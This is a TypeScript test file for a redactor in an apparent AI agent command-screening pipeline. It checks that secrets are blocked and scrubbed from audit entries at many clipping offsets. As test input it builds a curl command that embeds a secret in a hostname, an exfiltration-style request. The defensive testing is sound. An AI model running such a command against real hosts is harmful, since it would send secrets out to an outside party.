import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { createPipelineBed, interactiveRules } from "../testing/pipeline-bed.ts";
import { createRedactor } from "./redact.ts";

let bed: Awaited<ReturnType<typeof createPipelineBed>>;
beforeAll(async () => {
  bed = await createPipelineBed();
});
afterAll(() => bed.dispose());

const rules = { ...interactiveRules, allowHosts: ["allowed.example"] };

/** Every run of 4 characters of the secret, in either case: none may reach the audit entry. */
function leaks(text: string, secret: string): string[] {
  const lower = text.toLowerCase();
  const runs = new Set<string>();
  for (let i = 0; i + 4 <= secret.length; i++) runs.add(secret.slice(i, i + 4).toLowerCase());
  return [...runs].filter((run) => lower.includes(run));
}

describe("a stage reason is redacted before anything clips it (R69)", () => {
  it.each([
    ["mixed case", "Xq7Lm2Zp9Rv4Tn8Bk3Ys6Wd1"],
    ["lower-case hex", "9f3a1c7be2d84056a1b3c5d7"],
  ])(
    "leaves no run of 4 characters of a %s secret in the audit entry, at every offset across 200 and 256",
    async (_, secret) => {
      const redactor = createRedactor({ entries: [{ name: "S", value: secret }] });
      for (let offset = 150; offset <= 236; offset++) {
        const h = bed.harness({
          rules: () => rules,
          redact: (text) => redactor.text(text).text,
          redactReason: (text) => redactor.textFolded(text).text,
        });
        const result = await h.run("bash", { command: `curl http://${"a".repeat(offset)}${secret}.test/x` });
        const entry = h.entries.at(-1);
        expect(entry, `offset ${offset}`).toMatchObject({ decision: "block" });
        expect(leaks(JSON.stringify([entry, result]), secret), `offset ${offset}`).toEqual([]);
      }
    },
  );

  it("redacts the reason before the entry clips it too", async () => {
    const secret = "Xq7Lm2Zp9Rv4Tn8Bk3Ys6Wd1";
    const redactor = createRedactor({ entries: [{ name: "S", value: secret }] });
    const h = bed.harness({
      rules: () => rules,
      redactReason: (text) => redactor.textFolded(text).text,
      stages: {
        denylist: () => ({ outcome: "block", reason: `${"x".repeat(1010)}${secret}`, modelReason: "m" }),
      },
    });
    await h.run("bash", { command: "echo hi" });
    const entry = h.entries.at(-1);
    expect(leaks(JSON.stringify(entry), secret)).toEqual([]);
  });
});
